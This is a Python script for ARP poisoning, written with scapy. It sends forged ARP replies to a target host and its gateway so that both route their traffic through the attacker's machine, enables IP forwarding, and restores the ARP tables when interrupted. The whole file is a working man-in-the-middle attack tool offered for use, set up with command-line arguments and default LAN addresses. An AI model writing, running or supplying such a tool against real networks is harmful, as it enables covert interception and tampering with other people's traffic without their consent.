#!/usr/bin/env python3

import sys
import time
import argparse
import scapy.all as scapy
from rules import enable_ip_forwarding

def parse_args():
    p = argparse.ArgumentParser(description="ARP Poisoning Tool")
    p.add_argument("--target-ip", default="192.168.2.12", help="Target host IP")
    p.add_argument("--gateway-ip", default="192.168.2.254", help="Gateway/router IP")
    p.add_argument("--interval", type=float, default=0.1, help="Loop delay in seconds")
    return p.parse_args()

def get_mac(ip):
    """
    Broadcasts an ARP Request to find the MAC address of a specific IP.

    :param ip: The IP address to query
    :return: The MAC address as a string
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # srp = Send and Receive Packet (at Layer 2)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # [0] because srp returns a tuple (answered, unanswered)

    if answered_list:
        return answered_list[0][1].hwsrc # Return the MAC address from the response
    else:
        return None

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet. After the spoofing, the target will associate the spoof_ip with our MAC address.

    :param target_ip: The IP address of the target machine
    :param spoof_ip: The IP address to spoof (the one we are pretending to be)
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    # Create the ARP packet with Ethernet header (op=2 means ARP Reply)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # No hwsrc means that we use our own MAC address
    
    # Send the packet
    scapy.sendp(packet, verbose=False)

def restore(dest_ip, source_ip):
    """
    Restores the ARP tables to their original state.

    :param dest_ip: The IP address of the destination machine
    :param source_ip: The IP address of the source machine
    """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    
    if dest_mac and source_mac:
        # Create the ARP packet with the correct MAC addresses
        packet = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)

        # Send the packet multiple times to ensure restoration
        scapy.sendp(packet, count=4, verbose=False)

def main(target_ip, gateway_ip, interval):
    try:
        enable_ip_forwarding()

        print(f"[*] ARP Poisoning started on {target_ip} <--> {gateway_ip}")

        while True:
            # Tell the Victim that I am the Router
            spoof(target_ip, gateway_ip)
            
            # Tell the Router that I am the Victim
            spoof(gateway_ip, target_ip)
            
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Restoring ARP tables...")
        restore(TARGET_IP, GATEWAY_IP)
        restore(GATEWAY_IP, TARGET_IP)
        print("[+] Network restored. Exiting.")

# Main Execution
if __name__ == "__main__":
    args = parse_args()

    TARGET_IP = args.target_ip          # Victim IP
    GATEWAY_IP = args.gateway_ip        # Router/Gateway IP
    INTERVAL = args.interval            # Loop delay in seconds

    main(TARGET_IP, GATEWAY_IP, INTERVAL)